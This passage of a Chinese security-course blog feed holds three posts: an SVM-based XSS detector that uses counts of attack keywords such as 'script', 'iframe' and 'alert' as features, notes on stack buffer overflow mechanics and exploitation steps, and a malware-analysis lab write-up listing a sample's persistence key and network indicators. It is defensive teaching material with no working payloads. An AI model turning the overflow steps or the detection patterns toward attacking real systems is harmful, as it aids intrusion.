class="hljs-string">&#x27;label&#x27;</span>] = <span class="hljs-number">0</span>  <span class="hljs-comment"># 0 表示正常语句</span><br>xss_data[<span class="hljs-string">&#x27;label&#x27;</span>] = <span class="hljs-number">1</span>     <span class="hljs-comment"># 1 表示攻击性语句</span><br><br><span class="hljs-comment"># 合并数据</span><br>data = pd.concat([normal_data, xss_data], ignore_index=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># 转换为小写</span><br>data[<span class="hljs-number">0</span>] = data[<span class="hljs-number">0</span>].<span class="hljs-built_in">str</span>.lower()<br><br><span class="hljs-comment"># 打印前五行数据</span><br><span class="hljs-built_in">print</span>(data.head())<br><span class="hljs-comment"># 打印后五行数据</span><br><span class="hljs-built_in">print</span>(data.tail())<br><br><span class="hljs-comment"># 特征提取</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_features</span>(<span class="hljs-params">text</span>):<br>    script_count = <span class="hljs-built_in">len</span>(re.findall(<span class="hljs-string">r&#x27;script&#x27;</span>, text, re.I))<br>    java_count = <span class="hljs-built_in">len</span>(re.findall(<span class="hljs-string">r&#x27;java&#x27;</span>, text, re.I))<br>    iframe_count = <span class="hljs-built_in">len</span>(re.findall(<span class="hljs-string">r&#x27;iframe&#x27;</span>, text, re.I))<br>    alert_count = <span class="hljs-built_in">len</span>(re.findall(<span class="hljs-string">r&#x27;alert&#x27;</span>, text, re.I))<br>    lt_count = text.count(<span class="hljs-string">&#x27;&lt;&#x27;</span>)<br>    gt_count = text.count(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>    double_quote_count = text.count(<span class="hljs-string">&#x27;\&quot;&#x27;</span>)<br>    single_quote_count = text.count(<span class="hljs-string">&quot;\&#x27;&quot;</span>)<br>    percent_count = text.count(<span class="hljs-string">&#x27;%&#x27;</span>)<br>    left_parenthesis_count = text.count(<span class="hljs-string">&#x27;(&#x27;</span>)<br>    right_parenthesis_count = text.count(<span class="hljs-string">&#x27;)&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [script_count, java_count, iframe_count, lt_count,alert_count, gt_count, double_quote_count,<br>            single_quote_count, percent_count, left_parenthesis_count, right_parenthesis_count]<br><br>data[<span class="hljs-string">&#x27;features&#x27;</span>] = data[<span class="hljs-number">0</span>].apply(extract_features)<br></code></pre></td></tr></table></figure><h2 id="模型训练">3. 模型训练</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 将数据拆分为特征和标签</span><br>X = <span class="hljs-built_in">list</span>(data[<span class="hljs-string">&#x27;features&#x27;</span>])<br>y = data[<span class="hljs-string">&#x27;label&#x27;</span>]<br><br><span class="hljs-comment"># 拆分数据集为训练集和测试集</span><br>X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="hljs-number">0.2</span>, random_state=<span class="hljs-number">42</span>)<br><br><span class="hljs-comment"># 创建SVM分类器</span><br>svm_classifier = SVC(kernel=<span class="hljs-string">&#x27;linear&#x27;</span>)<br><br><span class="hljs-comment"># 训练模型，并加入进度条</span><br>num_epochs = <span class="hljs-number">100</span>  <span class="hljs-comment"># 设置训练迭代次数</span><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(num_epochs), desc=<span class="hljs-string">&quot;Training SVM&quot;</span>):<br>    svm_classifier.fit(X_train, y_train)<br><br><span class="hljs-comment"># 保存训练好的模型到文件</span><br>joblib.dump(svm_classifier, <span class="hljs-string">&#x27;work/svm_model.pkl&#x27;</span>)<br><br><span class="hljs-comment"># 预测测试集</span><br>y_pred = svm_classifier.predict(X_test)<br></code></pre></td></tr></table></figure><h2 id="模型评估">4. 模型评估</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 计算准确率和召回率</span><br>accuracy = accuracy_score(y_test, y_pred)<br>recall = recall_score(y_test, y_pred)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;准确率: <span class="hljs-subst">&#123;accuracy:<span class="hljs-number">.10</span>f&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;召回率: <span class="hljs-subst">&#123;recall:<span class="hljs-number">.10</span>f&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="测试">5. 测试</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 加载已保存的模型</span><br>loaded_model = joblib.load(<span class="hljs-string">&#x27;work/svm_model.pkl&#x27;</span>)<br><br><span class="hljs-comment"># 输入数据测试</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_safe</span>(<span class="hljs-params">user_input, model</span>):<br>    features = extract_features(user_input)<br>    prediction = model.predict([features])<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;安全&quot;</span> <span class="hljs-keyword">if</span> prediction[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;不安全&quot;</span><br><br>user_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要检测的语句: &quot;</span>)<br><span class="hljs-built_in">print</span>(user_input)<br>user_input = user_input.lower()<br>result = is_safe(user_input, loaded_model)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;result&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="doc">Doc</h1><h2 id="概述">1. 概述</h2><h3 id="实验目的">1.1 实验目的</h3><p>本实验旨在创建一个用于检测跨站脚本（XSS）攻击的机器学习模型。我们将使用支持向量机（SVM）算法，并提取一组特定字符的数量作为特征，以检测用户输入是否存在XSS攻击风险。</p><h3 id="数据集">1.2 数据集</h3><p>我们使用了两个数据集：<code>dmzo_normal.csv</code>（正常语句数据集）和<code>xssed.csv</code>（XSS攻击性语句数据集）。这两个数据集分别包含一列文本数据。</p><h2 id="实验记录">2. 实验记录</h2><h3 id="数据预处理-1">2.1 数据预处理</h3><ul><li><p>读取数据集：使用Pandas库读取<code>dmzo_normal.csv</code>和<code>xssed.csv</code>。</p></li><li><p>创建标签：为两个数据集分别创建标签列，其中0表示正常语句，1表示攻击性语句。</p></li><li><p>合并数据：将两个数据集合并为一个数据帧，以便后续处理。</p></li><li><p>转换为小写：将文本数据转换为小写。</p></li><li><p>特征提取：使用正则表达式计算每个特定字符的数量，并将这些特征存储在新的列中。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 读取数据</span><br>normal_data = pd.read_csv(<span class="hljs-string">&#x27;./data/data52101/dmzo_nomal.csv&#x27;</span>, header=<span class="hljs-literal">None</span>)<br>xss_data = pd.read_csv(<span class="hljs-string">&#x27;./data/data52101/xssed.csv&#x27;</span>, header=<span class="hljs-literal">None</span>)<br><br><span class="hljs-comment"># 创建标签</span><br>normal_data[<span class="hljs-string">&#x27;label&#x27;</span>] = <span class="hljs-number">0</span>  <span class="hljs-comment"># 0 表示正常语句</span><br>xss_data[<span class="hljs-string">&#x27;label&#x27;</span>] = <span class="hljs-number">1</span>     <span class="hljs-comment"># 1 表示攻击性语句</span><br><br><span class="hljs-comment"># 合并数据</span><br>data = pd.concat([normal_data, xss_data], ignore_index=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># 转换为小写</span><br>data[<span class="hljs-number">0</span>] = data[<span class="hljs-number">0</span>].<span class="hljs-built_in">str</span>.lower()<br><br><span class="hljs-comment"># 打印前五行数据</span><br><span class="hljs-built_in">print</span>(data.head())<br><span class="hljs-comment"># 打印后五行数据</span><br><span class="hljs-built_in">print</span>(data.tail())<br><br><span class="hljs-comment"># 特征提取</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_features</span>(<span class="hljs-params">text</span>):<br>    script_count = <span class="hljs-built_in">len</span>(re.findall(<span class="hljs-string">r&#x27;script&#x27;</span>, text, re.I))<br>    java_count = <span class="hljs-built_in">len</span>(re.findall(<span class="hljs-string">r&#x27;java&#x27;</span>, text, re.I))<br>    iframe_count = <span class="hljs-built_in">len</span>(re.findall(<span class="hljs-string">r&#x27;iframe&#x27;</span>, text, re.I))<br>    alert_count = <span class="hljs-built_in">len</span>(re.findall(<span class="hljs-string">r&#x27;alert&#x27;</span>, text, re.I))<br>    lt_count = text.count(<span class="hljs-string">&#x27;&lt;&#x27;</span>)<br>    gt_count = text.count(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>    double_quote_count = text.count(<span class="hljs-string">&#x27;\&quot;&#x27;</span>)<br>    single_quote_count = text.count(<span class="hljs-string">&quot;\&#x27;&quot;</span>)<br>    percent_count = text.count(<span class="hljs-string">&#x27;%&#x27;</span>)<br>    left_parenthesis_count = text.count(<span class="hljs-string">&#x27;(&#x27;</span>)<br>    right_parenthesis_count = text.count(<span class="hljs-string">&#x27;)&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [script_count, java_count, iframe_count, lt_count,alert_count, gt_count, double_quote_count,<br>            single_quote_count, percent_count, left_parenthesis_count, right_parenthesis_count]<br><br>data[<span class="hljs-string">&#x27;features&#x27;</span>] = data[<span class="hljs-number">0</span>].apply(extract_features) <br></code></pre></td></tr></table></figure><h3 id="模型训练-1">2.2 模型训练</h3><ul><li>创建SVM模型：使用支持向量机（SVM）算法创建一个分类模型。</li><li>训练模型：使用训练数据对SVM模型进行训练。</li><li>迭代次数：我们设置了训练迭代次数为10，以确保模型收敛。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 将数据拆分为特征和标签</span><br>X = <span class="hljs-built_in">list</span>(data[<span class="hljs-string">&#x27;features&#x27;</span>])<br>y = data[<span class="hljs-string">&#x27;label&#x27;</span>]<br><br><span class="hljs-comment"># 拆分数据集为训练集和测试集</span><br>X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="hljs-number">0.2</span>, random_state=<span class="hljs-number">42</span>)<br><br><span class="hljs-comment"># 创建SVM分类器</span><br>svm_classifier = SVC(kernel=<span class="hljs-string">&#x27;linear&#x27;</span>)<br><br><span class="hljs-comment"># 训练模型，并加入进度条</span><br>num_epochs = <span class="hljs-number">10</span>  <span class="hljs-comment"># 设置训练迭代次数</span><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(num_epochs), desc=<span class="hljs-string">&quot;Training SVM&quot;</span>):<br>    svm_classifier.fit(X_train, y_train)<br><br><span class="hljs-comment"># 保存训练好的模型到文件</span><br>joblib.dump(svm_classifier, <span class="hljs-string">&#x27;work/svm_model.pkl&#x27;</span>)<br><br><span class="hljs-comment"># 预测测试集</span><br>y_pred = svm_classifier.predict(X_test)<br></code></pre></td></tr></table></figure><h3 id="模型评估-1">2.3 模型评估</h3><ul><li>使用测试集：将训练好的模型应用于测试集。</li><li>计算准确率和召回率：使用<code>accuracy_score</code>和<code>recall_score</code>计算模型的性能指标。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311181708031.png"alt="image-20231015190345011" /><figcaption aria-hidden="true">image-20231015190345011</figcaption></figure><h2 id="测试-1">3. 测试</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311181708032.png"alt="image-20231118170754235" /><figcaption aria-hidden="true">image-20231118170754235</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
      <category>实践篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH4-软件漏洞-缓冲区溢出</title>
    <link href="/2023/10/15/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/04%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <url>/2023/10/15/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/04%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="概述">4.1 概述</h1><p><strong>漏洞定义：</strong>可以被攻击利用的系统弱点</p><p><strong>漏洞攻击过程：</strong>漏洞发现、漏洞分析、漏洞利用</p><p><strong>漏洞造成后果：</strong>以匿名身份直接获取系统最高权限；从普通用户提升为管理员用户；实施远程拒绝服务攻击等</p><h1 id="典型的漏洞类型">4.2 典型的漏洞类型</h1><h2 id="栈溢出">4.2.1 栈溢出</h2><h3 id="栈溢出原理">1.栈溢出原理</h3><p>当程序运行时，计算机会在内存区域中开辟一段连续的内存块，包括代码段、数据段和堆栈段三部分。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310151742321.png"alt="image-20231015162805933" /><figcaption aria-hidden="true">image-20231015162805933</figcaption></figure><p>程序在内存中的存放形式</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310151742323.png"alt="image-20231015163018123" /><figcaption aria-hidden="true">image-20231015163018123</figcaption></figure><ul><li>代码段(.text)：也称文本段(TextSegment)，存放着程序的机器码和只读数据，可执行指令就是从这里取得的，这个段在内存中一般被标记为只读，任何对该区的写操作都会导致段错误(SegmentationFault)</li><li>数据段：包括已初始化的数据段(.data)和未初始化的数据段(.bss)，前者用来存放保存全局的和静态的已初始化变量，后者用来保存全局的和静态的未初始化变量。数据段在编译时分配。</li><li>堆（Heap）：向<strong>高</strong>地址扩展的数据结构，是不连续的内存区域。动态分配，其空间的分配和释放都由程序员控制。也就是说，堆的大小并不固定，可动态扩张或缩减，其分配由<code>malloc()</code>等这类实时内存分配函数来实现。当进程调用<code>malloc()</code>等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用<code>free()</code>等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</li><li>栈（Stack）：向<strong>低</strong>地址扩展的数据结构，是一块连续的内存区域。一种用来存储函数调用时的临时信息的结构，如函数调用所传递的参数、函数的返回地址、函数的局部变量等。由编译器自动管理，其分配方式有两种：静态分配和动态分配。静态分配由编译器完成，比如局部变量的分配。动态分配由<code>alloca()</code>函数进行分配，但是栈的动态分配和堆是不同的，它的动态分配是由编译器进行释放，无需手工控制。</li></ul><p>实例：假设一个程序的函数调用顺序为：主函数main调用函数func1，函数func1调用函数func2。当这个程序被操作系统调入内存运行时，其对应的进程在内存中的映射结果如下图所示。进程的<strong>栈</strong>是由多个<strong>栈帧</strong>构成的，其中每个<strong>栈帧</strong>都对应一个<strong>函数调用</strong>。当调用函数时，新的栈帧被压入栈；当函数返回时，相应的栈帧从栈中弹出。各函数的栈帧大小随着函数的性质的不同而不等，由函数的局部变量的数目决定。由于需要将函数返回地址这样的重要数据保存在程序员可见的堆栈中，因此也给系统安全带来了极大的隐患。</p><p>如果在堆栈中压入的数据超过预先给堆栈分配的容量时，就会出现堆栈溢出，从而使得程序运行失败；如果发生溢出的是大型程序还有可能会导致系统崩溃。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310151742324.png"alt="image-20231015163904871" /><figcaption aria-hidden="true">image-20231015163904871</figcaption></figure><p><strong>栈帧：</strong>某个函数运行时，机器需要分配一定的内存去进行函数内的各种操作，这个过程中分配的那部分栈称为栈帧。下图描述了栈帧的通用结构。栈帧是一段有界限的内存区间，由最顶端的两个指针界定，寄存器%ebp为帧指针，而寄存器%esp为栈指针。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310151742325.png"alt="image-20231015165704058" /><figcaption aria-hidden="true">image-20231015165704058</figcaption></figure><h3 id="函数调用机制">2.函数调用机制</h3><ol type="1"><li><p><strong>从右至左</strong>依次把被调函数需要的参数压入栈</p></li><li><p>使用call指令调用被调函数，并把call指令的下一条指令的地址作为返回地址压入栈中（该压栈操作隐含在call指令中）。call指令完成两项操作：一是将返回地址（call指令下一条指令地址）压入栈，二是跳转到调用函数入口处</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-keyword">call</span> 被调用函数地址<br><span class="hljs-meta"># 等价操作</span><br><span class="hljs-keyword">push</span> 返回地址<br><span class="hljs-keyword">jmp</span>  被调用函数地址<br></code></pre></td></tr></table></figure></li><li><p>进入被调函数执行。被调函数会先保存调用者函数的栈底地址（<code>push ebp</code>），然后进行栈帧切换，把调用者函数的栈顶切换成被调函数的栈底，即调用函数的栈顶就是当前被调函数的栈底（<code>mov ebp，esp</code>）</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">push</span> <span class="hljs-built_in">ebp</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebp</span>,<span class="hljs-built_in">esp</span><br></code></pre></td></tr></table></figure></li><li><p>为局部变量和临时变量开辟存储空间。先定义的变量先入栈，后定义的变量后入栈。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">sub</span> <span class="hljs-built_in">esp</span>，xxx<br></code></pre></td></tr></table></figure></li><li><p>函数调用返回</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"># 恢复栈帧<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">esp</span>,<span class="hljs-built_in">ebp</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebp</span><br># 返回调用者函数执行<br><span class="hljs-keyword">ret</span>  # 等价于<span class="hljs-keyword">pop</span> <span class="hljs-built_in">eip</span><br></code></pre></td></tr></table></figure></li></ol><p>实例：C程序每条语句对寄存器的影响情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br><span class="hljs-keyword">return</span> a + b;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">int</span> i = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> j = <span class="hljs-number">16</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, add(i, j));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr class="header"><th style="text-align: center;">汇编</th><th style="text-align: center;">影响</th><th style="text-align: center;">受影响的寄存器取值</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">mov dword ptr [i],0Ah</td><td style="text-align: center;">EIP</td><td style="text-align: center;">EIP = 00A818CC</td></tr><tr class="even"><td style="text-align: center;">mov dword ptr [j],10h</td><td style="text-align: center;">EIP</td><td style="text-align: center;">EIP = 00A818D3</td></tr><tr class="odd"><td style="text-align: center;">mov eax,dword ptr [j]</td><td style="text-align: center;">EAX;EIP</td><td style="text-align: center;">EAX = 00000010;EIP = 00A818D6</td></tr><tr class="even"><td style="text-align: center;">push eax</td><td style="text-align: center;">ESP-4;EIP</td><td style="text-align: center;">ESP = 00EFF958;EIP = 00A818D7</td></tr><tr class="odd"><td style="text-align: center;">mov ecx,dword ptr [i]</td><td style="text-align: center;">ECX;EIP</td><td style="text-align: center;">ECX = 0000000A;EIP = 00A818DA</td></tr><tr class="even"><td style="text-align: center;">push ecx</td><td style="text-align: center;">ESP-4;EIP</td><td style="text-align: center;">ESP = 00EFF954;EIP = 00A818DB</td></tr><tr class="odd"><td style="text-align: center;">push ebp</td><td style="text-align: center;">ESP-4;EIP</td><td style="text-align: center;">ESP = 00EFF94C;EIP = 00A81771</td></tr><tr class="even"><td style="text-align: center;">mov ebp,esp</td><td style="text-align: center;">EBP=ESP;EIP</td><td style="text-align: center;">EBP = 00EFF94C;EIP = 00A81773</td></tr><tr class="odd"><td style="text-align: center;">mov eax,dword ptr [a]</td><td style="text-align: center;">EAX;EIP</td><td style="text-align: center;">EAX = 0000000A;EIP = 00A81794</td></tr><tr class="even"><td style="text-align: center;">add eax,dword ptr [b]</td><td style="text-align: center;">EAX;EIP</td><td style="text-align: center;">EAX = 0000001A;EIP = 00A81797</td></tr><tr class="odd"><td style="text-align: center;">mov esp,ebp</td><td style="text-align: center;">ESP=EBP；EIP</td><td style="text-align: center;">EIP = 00A817A9</td></tr><tr class="even"><td style="text-align: center;">pop ebp</td><td style="text-align: center;">EBP;ESP+4;EIP</td><td style="text-align: center;">EBP = 00B8F9CC;ESP = 00B8F8DC;EIP =00A817AA</td></tr><tr class="odd"><td style="text-align: center;">ret</td><td style="text-align: center;">ESP+4;EIP</td><td style="text-align: center;">ESP = 00B8F8E0;EIP = 00A818E0</td></tr><tr class="even"><td style="text-align: center;">add esp,8</td><td style="text-align: center;">ESP+8;EFL;EIP</td><td style="text-align: center;">ESP = 00B8F8E8;EFL = 00000206;EIP =00A818E3</td></tr></tbody></table><h2 id="堆溢出">4.2.2 堆溢出</h2><h2 id="格式化串漏洞">4.2.3 格式化串漏洞</h2><h2 id="整型溢出">4.2.4 整型溢出</h2><h2 id="释放再使用">4.2.5 释放再使用</h2><h1 id="溢出漏洞利用原理">4.3 溢出漏洞利用原理</h1><h2 id="溢出攻击的基本流程">4.3.1 溢出攻击的基本流程</h2><ol type="1"><li>注入恶意数据</li><li>溢出缓冲区</li><li>重定向控制流</li><li>执行有效载荷</li></ol><h2 id="溢出利用的关键技术">4.3.2 溢出利用的关键技术</h2><ul><li>溢出点定位</li><li>覆盖执行控制地址</li><li>覆盖异常处理结构</li><li>跳转地址的确定</li><li>Shellcode定位和跳转</li></ul><h1 id="漏洞利用保护机制">4.4 漏洞利用保护机制</h1><ul><li>GS编译保护机制</li><li>SafeSEH保护机制</li><li>DEP机制</li><li>ASLR机制</li></ul><p>参考教程：</p><ol type="1"><li><a href="https://zhuanlan.zhihu.com/p/186812518">一文理解缓冲区溢出- 知乎 (zhihu.com)</a></li><li>https://blog.csdn.net/xbb224007/article/details/80106961</li></ol>]]></content>
    
    
    <categories>
      
      <category>网络攻防技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Chapter_3L</title>
    <link href="/2023/10/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%AE%9E%E9%AA%8C%E7%AF%87/Chapter_3L/"/>
    <url>/2023/10/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E5%AE%9E%E9%AA%8C%E7%AF%87/Chapter_3L/</url>
    
    <content type="html"><![CDATA[<h1 id="lab-03-01">Lab 03-01</h1><h2 id="简要答案">简要答案</h2><p>Q1：找出这个恶意代码的导入函数与字符串列表?</p><p>Q2：这个恶意代码在主机上的感染迹象特征是什么?</p><p>Q3：这个恶意代码是否存在一些有用的网络特征码？如果存在，它们是什么？</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122856.png"alt="image-20231014085930356" /><figcaption aria-hidden="true">image-20231014085930356</figcaption></figure><h2 id="详细分析">详细分析</h2><p>首先用PEiD打开<code>Lab03-01.exe</code>，可以看到<code>Lab03-01.exe</code>是加壳的.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122857.png"alt="image-20231012162113880" /><figcaption aria-hidden="true">image-20231012162113880</figcaption></figure><p>查看导入表，唯一的导入函数是<code>ExitProcess</code>.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122858.png"alt="image-20231012162344159" /><figcaption aria-hidden="true">image-20231012162344159</figcaption></figure><p>Strings查看字符串，因为文件加壳，所以有很多不可识别字符串，但我们还是可以看到一些可能有用的信息，如：注册表、网址等.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122859.png"alt="image-20231013184322657" /><figcaption aria-hidden="true">image-20231013184322657</figcaption></figure><p>先运行进程监视器、进程浏览器、Wireshark，再运行<code>Lab03-01.exe</code>.使用进程浏览器查看<code>Lab03-01.exe</code>的Handles，发现其创建了一个互斥量，恶意程序经常进行该操作，从而在某个时刻独占某个计算机资源.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122860.png"alt="image-20231013184906179" /><figcaption aria-hidden="true">image-20231013184906179</figcaption></figure><p>再查看该程序的DLLs，下图框选的两个动态链接库说明程序有联网操作.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122861.png"alt="image-20231013185452760" /><figcaption aria-hidden="true">image-20231013185452760</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122863.png"alt="image-20231014085102970" /><figcaption aria-hidden="true">image-20231014085102970</figcaption></figure><p>使用进程监视器设置过滤条件，以查看恶意代码对文件系统和注册表的修改操作.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122864.png"alt="image-20231013185649467" /><figcaption aria-hidden="true">image-20231013185649467</figcaption></figure><p>Seed表明该程序可能会有一些随机数相关的操作；程序创建了一个可执行文件<code>vmx32to64</code>；加入了一个自启动项<code>VideoDriver</code>.我们经常需要筛选出一定数量的噪声，<code>HKLM\SOFTARE\Microsoft\Cryptography\RNG\Seed</code>键值上的 <code>RegSetValue</code>操作是典型的噪声.因为随机数发生器的种子会有软件在注册表中不停地更新.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122865.png"alt="image-20231013190041973" /><figcaption aria-hidden="true">image-20231013190041973</figcaption></figure><p>查看自启动项关联的可执行文件，比对大小（或比对md5值），发现刚好与<code>Lab03-01.exe</code>相同，可以判断它们就是同一个程序.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122866.png"alt="image-20231013191125258" /><figcaption aria-hidden="true">image-20231013191125258</figcaption></figure><p>查看wireshark，可以看到在不断进行www.practicalmalwareanalysis.com的域名解析.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310142122867.png"alt="image-20231013192113703" /><figcaption aria-hidden="true">image-20231013192113703</figcaption></figure><h1 id="lab-03-02">Lab 03-02</h1><h2 